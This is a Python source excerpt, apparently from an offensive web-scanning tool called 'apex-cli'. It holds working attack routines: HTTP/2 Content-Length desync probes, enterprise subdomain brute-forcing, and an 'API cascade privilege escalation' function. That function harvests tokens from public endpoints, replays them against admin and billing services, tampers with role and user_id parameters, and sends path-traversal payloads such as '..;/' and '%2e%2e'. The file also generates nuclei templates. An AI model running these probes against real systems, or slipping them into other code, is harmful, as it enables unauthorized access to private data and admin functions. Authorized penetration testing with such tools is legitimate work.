            for jwks_path in ["/.well-known/jwks.json", "/oauth/jwks", "/auth/jwks.json", "/.well-known/openid-configuration"]:
                try:
                    r2 = _S.get(f"{base}{jwks_path}", timeout=_TIMEOUT_SHORT)
                    if r2.status_code == 200 and "keys" in r2.text:
                        findings.append({
                            "type": "JWKS Endpoint Exposed",
                            "severity": "low",
                            "url": f"{base}{jwks_path}",
                            "detail": "JWKS endpoint accessible. Public keys exposed (needed for key confusion attack).",
                            "template": "apex-jwks-exposed",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_request_smuggling_h2(web_targets):
    """HTTP/2 request smuggling — H2.CL and H2.TE desync attacks."""
    findings = []
    try:
        import httpx
    except ImportError:
        return findings

    for target in web_targets[:3]:
        try:
            with httpx.Client(http2=True, verify=False, timeout=10) as client:
                # H2.CL: Send HTTP/2 request with Content-Length that disagrees with body
                # This is hard to test safely, so we just check if H2 is supported
                # and if the server processes CL headers in H2 (it shouldn't)
                r = client.get(target)
                if r.http_version == "HTTP/2":
                    # Try sending a request with both CL and body mismatch
                    try:
                        r2 = client.post(target, content="x" * 10,
                                         headers={"content-length": "0"})
                        # If server accepts CL:0 but we sent 10 bytes, desync possible
                        if r2.status_code == 200:
                            findings.append({
                                "type": "HTTP/2 Potential Desync (H2.CL)",
                                "severity": "medium",
                                "url": target,
                                "detail": "Server accepts HTTP/2 with mismatched Content-Length. H2.CL smuggling may be possible.",
                                "template": "apex-h2-desync",
                            })
                    except Exception:
                        pass
        except Exception:
            continue
    return findings


def scan_subdomain_brute_deep(target):
    """Deep subdomain brute force with permutations for big companies."""
    findings = []
    subdomains_found = set()

    # High-value prefixes for enterprise targets
    prefixes = [
        "admin", "api", "api-dev", "api-staging", "api-internal", "api-v2",
        "staging", "stage", "stg", "dev", "development", "test", "testing",
        "uat", "qa", "preprod", "pre-prod", "sandbox", "demo",
        "internal", "intranet", "vpn", "remote", "gateway",
        "jenkins", "gitlab", "jira", "confluence", "bitbucket",
        "grafana", "kibana", "prometheus", "elastic", "redis",
        "mongo", "mysql", "postgres", "db", "database",
        "mail", "smtp", "imap", "exchange", "outlook",
        "sso", "auth", "login", "oauth", "identity", "keycloak",
        "cdn", "static", "assets", "media", "images", "files",
        "ws", "websocket", "realtime", "socket", "stream",
        "payment", "billing", "checkout", "stripe", "paypal",
        "support", "help", "docs", "documentation", "wiki",
        "status", "health", "monitor", "metrics", "logs",
        "backup", "bak", "old", "legacy", "archive",
        "beta", "alpha", "canary", "next", "preview",
        "mobile", "m", "app", "ios", "android",
    ]

    import socket
    base_domain = target

    # Batch DNS resolution
    for prefix in prefixes:
        hostname = f"{prefix}.{base_domain}"
        try:
            ip = socket.gethostbyname(hostname)
            subdomains_found.add(hostname)
        except socket.gaierror:
            continue

    if subdomains_found:
        # Check which are alive and interesting
        urls = [f"https://{s}" for s in subdomains_found]
        alive = []
        for url, r in batch_get(urls, timeout=5):
            if r and r.status_code < 500:
                alive.append(url)

        if alive:
            interesting = [u for u in alive if any(x in u for x in
                          ["admin", "internal", "staging", "dev", "jenkins", "gitlab",
                           "grafana", "kibana", "elastic", "redis", "mongo", "backup"])]
            if interesting:
                findings.append({
                    "type": f"High-Value Subdomains Found ({len(interesting)})",
                    "severity": "medium",
                    "url": interesting[0],
                    "detail": f"Found {len(subdomains_found)} subdomains, {len(alive)} alive, {len(interesting)} high-value: {[u.split('//')[1] for u in interesting[:5]]}",
                    "template": "apex-subdomain-deep",
                })

    return findings, list(subdomains_found)


# ---------------------------------------------------------------------------
# NOVEL: API Cascade Privilege Escalation
# Exploits trust between microservices sharing the same auth gateway.
# Most apps validate auth at the gateway but don't re-validate at each service.
# ---------------------------------------------------------------------------

def scan_api_cascade_privesc(crawl_data, web_targets):
    """API Cascade Privilege Escalation — exploit inter-service trust.
    
    Novel attack: When multiple microservices share an API gateway, a token
    valid for Service A is often accepted by Service B without checking
    if the user has permissions for Service B's resources.
    
    This finds cases where:
    1. A low-privilege endpoint gives you a token/session
    2. That same token works on higher-privilege endpoints
    3. The higher-privilege endpoint returns data it shouldn't
    """
    findings = []

    # Step 1: Map service boundaries from URL patterns
    service_map = {}  # service_name -> [endpoints]
    for url in list(crawl_data.get("params", {}).keys()) + [p["url"] for p in crawl_data.get("pages", [])]:
        parsed = urllib.parse.urlparse(url)
        parts = parsed.path.strip("/").split("/")
        if len(parts) >= 2 and parts[0] in ("api", "v1", "v2", "v3"):
            service = parts[1] if len(parts) > 1 else parts[0]
            service_map.setdefault(service, []).append(url)
        elif len(parts) >= 1:
            service_map.setdefault(parts[0], []).append(url)

    if len(service_map) < 2:
        return findings

    # Step 2: Categorize services by privilege level
    high_priv = ["admin", "billing", "payment", "internal", "management",
                 "config", "settings", "users", "accounts", "audit", "system"]
    low_priv = ["public", "docs", "health", "status", "search", "products",
                "catalog", "feed", "news", "blog"]

    high_services = {s: urls for s, urls in service_map.items()
                     if any(h in s.lower() for h in high_priv)}
    low_services = {s: urls for s, urls in service_map.items()
                    if any(l in s.lower() for l in low_priv)}

    # Step 3: Get a session/token from a low-privilege endpoint
    session_tokens = {}
    for target in web_targets[:3]:
        base = target.rstrip("/")
        # Try to get a token from public/low-priv endpoints
        for path in ["/api/auth/guest", "/api/public/token", "/api/health",
                     "/api/docs", "/api/status"]:
            try:
                r = _S.get(f"{base}{path}", timeout=_TIMEOUT_SHORT)
                # Extract any token from response
                if r.status_code == 200:
                    # Check cookies
                    if r.cookies:
                        session_tokens["cookies"] = dict(r.cookies)
                    # Check for token in body
                    token_match = re.search(r'"(?:token|access_token|session)":\s*"([^"]+)"', r.text)
                    if token_match:
                        session_tokens["bearer"] = token_match.group(1)
            except Exception:
                continue

    # Step 4: Try using low-priv credentials on high-priv endpoints
    for service_name, urls in high_services.items():
        for url in urls[:3]:
            try:
                # Request without auth (baseline)
                r_noauth = _S.get(url, timeout=_TIMEOUT_SHORT)

                # Request with low-priv session
                headers = {}
                cookies = {}
                if "bearer" in session_tokens:
                    headers["Authorization"] = f"Bearer {session_tokens['bearer']}"
                if "cookies" in session_tokens:
                    cookies = session_tokens["cookies"]

                r_lowpriv = _S.get(url, headers=headers, cookies=cookies, timeout=_TIMEOUT_SHORT)

                # If low-priv token gives access where no-auth doesn't
                if r_noauth.status_code in (401, 403) and r_lowpriv.status_code == 200:
                    if len(r_lowpriv.text) > 100:
                        findings.append({
                            "type": f"API Cascade Privilege Escalation ({service_name})",
                            "severity": "critical",
                            "url": url,
                            "detail": f"Low-privilege token accepted by high-privilege service '{service_name}'. "
                                      f"Gateway trusts token without per-service authorization check.",
                            "template": "apex-cascade-privesc",
                        })
                        break

                # Also test: can we access other users' data in this service?
                # Try changing user context in the same service
                if r_lowpriv.status_code == 200:
                    # Try accessing admin-level operations
                    admin_ops = [f"{url}/all", f"{url}?role=admin", f"{url}?user_id=1"]
                    for admin_url in admin_ops:
                        r_admin = _S.get(admin_url, headers=headers, cookies=cookies,
                                         timeout=_TIMEOUT_SHORT)
                        if r_admin.status_code == 200 and len(r_admin.text) > len(r_lowpriv.text) + 200:
                            findings.append({
                                "type": f"API Cascade — Cross-Service Data Access ({service_name})",
                                "severity": "critical",
                                "url": admin_url,
                                "detail": f"Low-priv token on '{service_name}' returns elevated data. "
                                          f"Response +{len(r_admin.text)-len(r_lowpriv.text)} bytes vs normal.",
                                "template": "apex-cascade-data",
                            })
                            break
            except Exception:
                continue

    # Step 5: Test cross-service request forgery
    # If Service A can make requests to Service B internally
    for target in web_targets[:3]:
        base = target.rstrip("/")
        for low_svc in list(low_services.keys())[:3]:
            for high_svc in list(high_services.keys())[:3]:
                # Try to reach high-priv service through low-priv service's proxy/redirect
                proxy_urls = [
                    f"{base}/api/{low_svc}/../{high_svc}",
                    f"{base}/api/{low_svc}/%2e%2e/{high_svc}",
                    f"{base}/api/{low_svc}/..;/{high_svc}",
                ]
                for proxy_url in proxy_urls:
                    try:
                        r = _S.get(proxy_url, timeout=_TIMEOUT_SHORT)
                        if r.status_code == 200 and len(r.text) > 100:
                            # Check if we got high-priv service response
                            if any(x in r.text.lower() for x in ["admin", "billing", "payment",
                                                                    "internal", "config"]):
                                findings.append({
                                    "type": f"API Cascade — Path Traversal Between Services",
                                    "severity": "critical",
                                    "url": proxy_url,
                                    "detail": f"Traversed from '{low_svc}' to '{high_svc}' via path confusion. "
                                              f"Internal service routing exploited.",
                                    "template": "apex-cascade-traversal",
                                })
                                break
                    except Exception:
                        continue
    return findings


# ---------------------------------------------------------------------------
# Todo #11: Subdomain monitoring daemon
# Todo #12: Nuclei template generator from findings
# ---------------------------------------------------------------------------

def generate_nuclei_template(finding):
    """Generate a nuclei YAML template from a scan finding. (#12)"""
    ftype = finding.get("type", "unknown")
    url = finding.get("url", "")
    detail = finding.get("detail", "")
    severity = finding.get("severity", "medium")
    template_id = re.sub(r'[^a-z0-9-]', '-', ftype.lower())[:40]

    parsed = urllib.parse.urlparse(url)
    path = parsed.path or "/"
    query = parsed.query

    # Determine request method and matchers
    if "sqli" in ftype.lower():
        matcher = "word"
        match_values = ["sql syntax", "mysql", "ORA-", "postgresql"]
    elif "xss" in ftype.lower():
        matcher = "word"
        match_values = ["<script>", "onerror=", "alert("]
    elif "ssrf" in ftype.lower():
        matcher = "word"
        match_values = ["ami-id", "instance-id", "meta-data"]
    else:
        matcher = "status"
        match_values = ["200"]

    template = f"""id: apex-{template_id}

info:
  name: {ftype}
  author: apex-cli
  severity: {severity}
  description: |
    {detail[:200]}
  tags: apex,custom

requests:
  - method: GET
    path:
      - "{{{{BaseURL}}}}{path}{'?' + query if query else ''}"
    matchers:
      - type: {matcher}
        {matcher}s:
{chr(10).join(f'          - "{v}"' for v in match_values)}
        condition: or
"""
    return template


def generate_all_nuclei_templates(findings, output_dir):
    """Generate nuclei templates for all findings."""
    templates_dir = os.path.join(output_dir, "nuclei_templates")
    os.makedirs(templates_dir, exist_ok=True)
    generated = 0
    for f in findings:
        if f.get("severity") not in ("critical", "high"):
            continue
        template = generate_nuclei_template(f)
        fname = re.sub(r'[^a-z0-9_]', '_', f["type"].lower())[:30]
        path = os.path.join(templates_dir, f"{fname}_{generated}.yaml")
        with open(path, "w") as fp:
            fp.write(template)
        generated += 1
    return generated
